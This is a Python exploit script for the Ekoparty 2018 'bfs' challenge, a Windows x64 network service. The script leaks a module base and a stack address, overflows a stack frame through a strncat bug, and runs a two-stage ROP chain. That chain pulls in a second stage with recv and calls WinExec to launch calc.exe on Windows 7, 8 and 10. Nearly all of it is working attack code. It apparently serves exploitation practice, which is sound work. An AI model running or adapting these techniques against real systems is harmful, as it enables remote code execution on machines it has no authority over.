#!/usr/bin/python
# bfs-ekoparty-2018-exploitation-challenge
# Win7-x64; Win8-x64; Win10-x64 'calc.exe' exploit
# @straight_blast ; straightblast426@gmail.com

import socket
import struct
import sys

global host
host = '127.0.0.1'
port = 41414

p32 = lambda x: struct.pack('<i', x)
p64 = lambda x: struct.pack('<q', x)
u64 = lambda x: struct.unpack('<Q', x)[0]

def establish_connection():
   s = socket.create_connection((host, port))
   f = s.makefile('rw', bufsize=0)
   f.write('Hello')
   f.read(2)
   return f

def overwrite(rsp_lift, stage1, stage2):
    f = establish_connection()
    operation = p32(0x22222222)
    # strncat(.,.,size_t num) ; num = 31. this will fit our choosen 8 bytes from user input
    # into operation_0x22222222's frame 1's RET address on the stack
    level_count = p32(31) 
    # the 2nd recursive stack frame of operation_0x22222222's "if do strncat" flag will have
    # the "ok" written to it, so that particular code path gets trigger.
    # the strncat will use the dest + offset as the destination, which will overwrite the 
    # 1st recursive stack frame of operation_0x11111111, so when that stack frame unwinds to
    # to return, it will jump to arbitrary address
    offset = p32(-112) 
    stage1 = 'A' * 22 + rsp_lift + 'B' * 26 + stage1
    size = len(stage1)
    data = p32(size) + operation + level_count + offset
    f.write(data)
    f.write(stage1)
    f.write(stage2)
    f.read(size)

def leak_address(type):
    f = establish_connection()
    size = 32
    operation = p32(0x11111111)
    level_count = p32(8)
    offset = 0
    if type == 'bfs_eko18':
       offset = p32(-88) # offset -88 points to the address after the call operation 0x11111111
    elif type == 'bfs_stack':
       offset = p32(-72) # offset -72 points to the stack address of our input buffer
    data = p32(size) + operation + level_count + offset
    f.write(data)
    data = 'A' * size
    f.write(data)
    output = f.read(size)

    '''
    The following algorithm will identified the proper address format
    This is done by sorting the bytes in our leaked dump
    
    If our leak address is in the format 0xAABBCCDDEEFFGGHH, it was observed the dump has the following pattern
    HHHHGGHHGGFFHHGGFFEEHHGGFFEECC .. etc. 

    Long story short, the least signficant bytes of the address gets repeated more time than higher signficant bytes.
    Therefore, use a 'dict' to tally each leaked address bytes and sort them from MOST to LEAST. That way I can 
    recover the address of the dump
    '''
    dump = output[11:]
    bytez = {}
    for byte in dump:
       if byte in bytez:
           bytez[byte] += 1
       else:
           bytez[byte] = 1
    sorted_bytez_tuple = sorted(bytez.items(), key = lambda x: x[1], reverse=True)
    leaked_address = ''.join([byte_tuple[0] for  byte_tuple in sorted_bytez_tuple])
    leaked_address = leaked_address + '\0' * (8 - len(leaked_address))
    return u64(leaked_address)


if __name__ == '__main__':

    platform = ''

    if len(sys.argv) < 3 or len(sys.argv) > 3:
        print "Usage: %s <target ip address> <win7|win8|win10>" % sys.argv[0]
        sys.exit(-1)
    else:
        host = sys.argv[1]
        platform = sys.argv[2]

    kernel32_winexec_offset = 0

    if platform == 'win7':
       kernel32_winexec_offset = 0x81CA0    # offset from kernel32!HeapCreate - Win 7 Professional SP 1 (2009)
    if platform == 'win8':
       kernel32_winexec_offset = 0xBFEA4    # offset from kernel32!HeapCreate - Win 8 Enterprise (2012)
    if platform == 'win10':
       kernel32_winexec_offset = 0x40E60    # offset from kernel32!HeapCreate - Win 10 Home (2018)

    leaked_bfs_addr = leak_address('bfs_eko18')
    leaked_stack_addr = leak_address('bfs_stack')   

    base_addr = leaked_bfs_addr - 0x1400013F2
    
    # gadgets

    # pop rax ; ret
    pop_rax = base_addr + 0x14000114B
    # pop rbx ; ret
    pop_rbx = base_addr + 0x1400022C1
    # pop rdi ; ret
    pop_rdi = base_addr + 0x140002609
    # pop r13 ; ret
    pop_r13 = base_addr + 0x140004423
    # pop r14 ; ret
    pop_r14 = base_addr + 0x14000939A
    # pop rbp ; ret
    pop_rbp = base_addr + 0x140002986 
    # pop rsp ; ret
    pop_rsp = base_addr + 0x1400032AB
    
    # add rsp, 0x10 ; ret
    add_rsp_10 = base_addr + 0x140002AE9
    # add rsp, 0x28 ; ret
    add_rsp_28 = base_addr + 0x140001221
    # add rsp, 0x38 ; ret
    add_rsp_38 = base_addr + 0x14000119C
    # add rsp, 0x88 ; ret
    add_rsp_88 = base_addr + 0x140002DBE

    # mov [rdi], rax ; call rbx
    mov_DER_rdi_DER_rax_call_rbx = base_addr + 0x1400027C0
    
    # add ecx, [rax - 1] ; ret
    add_ecx_DER_rax_minus_1_DER = base_addr + 0x1400056A2
    # lea eax, [rcx + rax - 7] ; ret
    lea_eax_DER_rcx_plus_rax_minus_7_DER = base_addr + 0x14000251C
    # mov rax, [r8 + rax*8 + 8] ; ret
    mov_rax_DER_r8_plus_rax_multi_8_plus_8_DER = base_addr + 0x140004DA7

    # mov rcx, rbx ; call rax
    mov_rcx_rbx_call_rax = base_addr + 0x140003B1E

    # mov r8, r14 ; mov rdx, r13 ; mov rcx, rbx ; call rax
    mov_r8_r14_mov_rdx_r13_mov_rcx_rbx_call_rax = base_addr + 0x1400075F9

    #mov r9d, ebp ; mov r8, r14 ; mov rdi, r13 ; mov rcx, rbx ; call rax
    mov_r9d_ebp_mov_r8_r14_mov_rdx_r13_mov_rcx_rbx_call_rax = base_addr + 0x1400075F6

    # cs:recv
    recv_addr = base_addr + 0x14000A258
    # cs:HeapCreate
    heapCreate_addr = base_addr + 0x14000A168

    # stage 1 - call w32.recv(socket_fd, my_desire_stack_location, 0x1000, 0) to read in stage 2 rop chain 
    # dereference cs:recv to get the address of w32.recv
    stage1  = p64(pop_r14)
    stage1 += p64(0)
    stage1 += p64(pop_rax)
    stage1 += p64(pop_rax)
    stage1 += p64(mov_r8_r14_mov_rdx_r13_mov_rcx_rbx_call_rax) # to put set r8 to 0
    stage1 += p64(pop_rax)
    stage1 += p64((recv_addr - 8) / 8)
    stage1 += p64(mov_rax_DER_r8_plus_rax_multi_8_plus_8_DER) # store w32.recv into RAX

    #store the value of RAX (w32.recv) onto a future stack location
    stage1 += p64(pop_rdi)
    stage1 += p64(leaked_stack_addr + 0x110)
    stage1 += p64(pop_rbx)
    stage1 += p64(pop_rbx)
    stage1 += p64(mov_DER_rdi_DER_rax_call_rbx) # store w32.recv into ss:[leak_stack_addr + 0x110]
    
    # setup w32.recv's arg
    # r9d -> flag 
    # r8d -> length
    # rdx -> buffer address
    # rcx -> socket file discriptor
    
    # we want our stage 2 ROP chain to be stored far away from existing stack frame
    new_stack_addr = leaked_stack_addr - 0x500

    stage1 += p64(pop_rbp)
    stage1 += p64(0)                         # goes into r9d     
    stage1 += p64(pop_r14)
    stage1 += p64(0x1000)                    # goes into r8d
    stage1 += p64(pop_r13)
    stage1 += p64(new_stack_addr)            # goes into rdx
    stage1 += p64(pop_rbx)
    stage1 += p64(0)                         # set rcx to 0 (we will recover socket FD later)
    stage1 += p64(pop_rax)
    stage1 += p64(pop_rax)
    stage1 += p64(mov_r9d_ebp_mov_r8_r14_mov_rdx_r13_mov_rcx_rbx_call_rax) 
    
    # retrieve the current socket file discriptor
    stage1 += p64(pop_rax)
    # the current socket FD is pushed onto the stack, as part of the 'process request' argument
    # it is offset +0x221 away from the leaked stack address
    stage1 += p64(leaked_stack_addr + 0x220 + 1) 
    # therefore, RCX had to be 0 so the addition will just be purely [rax - 1]
    stage1 += p64(add_ecx_DER_rax_minus_1_DER) 

    # by the time the RSP reached here, it will 'ret' the w32.recv stored here as the next instruction to execute
    stage1 += p64(0xdeadbeef) # place holder for storing the address of w32.recv on the stack

    # due to how w32.recv operates in different version of windows, some of the data before and after of the w32.recv will get
    # wiped out. Through trial and error, stack lifting by 0x28 land us in a stack space that gets left untouched by w32.recv
    stage1 += p64(add_rsp_28)
    stage1 += "A" * 8              # fillers
    stage1 += "B" * 8              # fillers
    stage1 += "C" * 8              # fillers
    stage1 += "D" * 8              # fillers
    stage1 += "E" * 8              # fillers
    stage1 += p64(pop_rsp)         # lets switch to the stack location where the stage 2 rop chain is read
    stage1 += p64(new_stack_addr)  
    stage1 += "H" * 8
    # we will store the path to 'calc' onto the stack, and reference it later through the leaked stack address
    stage1 += 'C:\windows\system32\calc.exe\0'
    
    # stage 2 - call kernel32.Winexec('C:\windows\system32\calc.exe',1)

    # setup rdx to be 1
    # setup rcx to point to cs:HeapCreate
    stage2  = p64(pop_r14)
    stage2 += p64(0)
    stage2 += p64(pop_r13)
    stage2 += p64(1)
    stage2 += p64(pop_rbx)
    stage2 += p64(kernel32_winexec_offset + 7)
    stage2 += p64(pop_rax)
    stage2 += p64(pop_rax)
    stage2 += p64(mov_r8_r14_mov_rdx_r13_mov_rcx_rbx_call_rax)

    # derefernece cs:HeapCreate to get the address of kernel32.HeapCreate
    stage2 += p64(pop_rdi)
    stage2 += p64(new_stack_addr + 0xD0)
    stage2 += p64(pop_rax)
    stage2 += p64((heapCreate_addr - 8) / 8)
    stage2 += p64(mov_rax_DER_r8_plus_rax_multi_8_plus_8_DER) # dereferenced kernel32.HeapCreate address
    stage2 += p64(lea_eax_DER_rcx_plus_rax_minus_7_DER)       # kernel32.HeapCreate + OFFSET = kernel32.Winexec
    stage2 += p64(pop_rbx)
    stage2 += p64(pop_rbx)
    stage2 += p64(mov_DER_rdi_DER_rax_call_rbx)               # store kernel32.Winexec onto a future stack location
    
    # copy stack address that holds 'calc' into RCX
    stage2 += p64(pop_rbx)
    stage2 += p64(leaked_stack_addr + 0x160)
    stage2 += p64(pop_rax)
    stage2 += p64(pop_rax)
    stage2 += p64(mov_rcx_rbx_call_rax)

    # it was observed on win10, kernel32.HeapCreate uses movaps xmm0 which requires the address of Winexec to be stored on a 
    # stack address that is 16 bytes align (AKA: the least 4 significant bits are 0)
    stage2 += p64(add_rsp_10)      # this is needed, to align the adress of kernel32.winexec onto a stack address
    stage2 += "A" * 8                  # filler            
    stage2 += "B" * 8                  # filler
    stage2 += p64(0xdeadc0de)          # place holder for address of kernel32.Winexec
    # the kernel32.Winexec uses the stack space differently for each windows version
    # it will sometime wipe out top and bottom adjacent memory of the kernel32.Winexec address
    # So after Winexec is done executing, lets return to a 'stack lift instruction' to lift our ass out of here to avoid any problems
    stage2 += p64(add_rsp_38)          # RET of kernel32.winexec 
    stage2 += "C" * 8                  # filler
    stage2 += "D" * 8                  # filler
    stage2 += "E" * 8                  # filler
    stage2 += "F" * 8                  # filler
    stage2 += "G" * 8                  # filler
    stage2 += "H" * 8                  # filler
    stage2 += "I" * 8                  # filler
    stage2 += p64(pop_rsp)             # pop RSP
    stage2 += p64(leaked_stack_addr + 0x218)  # the 'process request' stack location that holds is RET to cleanly to continue the process 
    
    overwrite(p64(add_rsp_88), stage1, stage2)
